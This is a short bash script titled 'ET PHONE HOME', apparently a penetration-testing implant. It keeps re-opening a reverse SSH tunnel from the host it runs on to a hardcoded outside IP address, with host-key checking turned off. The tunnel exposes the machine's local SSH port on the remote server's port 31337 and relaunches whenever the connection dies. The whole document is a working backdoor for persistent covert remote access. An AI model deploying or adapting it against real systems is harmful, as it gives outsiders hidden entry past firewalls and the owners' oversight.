#!/bin/bash
# ET PHONE HOME
# glenn@sensepost.com

ssh_user=phonehome
ssh_host=176.58.114.62
ssh_port=22
ssh_keyfile=/etc/ssh/phone_home_key

pid=313373133
control_c()
# run if user hits control-c
{
  echo -en "\n*** Ouch! Exiting ***\n"
  sleep 1
  kill -9 $pid 2>/dev/null
  exit
}
trap control_c SIGINT

echo "[+] Phoning home..."

while [ 1 ]
do
  if  ! kill -0 $pid 2> /dev/null
	then
		echo "[+] Attempting to initiate SSH tunnel ($ssh_user@$ssh_host over $ssh_port)" &> /tmp/phone_home.log
		ssh -N -o StrictHostKeyChecking=no -i $ssh_keyfile $ssh_user@$ssh_host -p $ssh_port -R 31337:localhost:22 &> phone_home.log &
		pid=$!
		echo "[+] Done."
	fi
	sleep 10
done
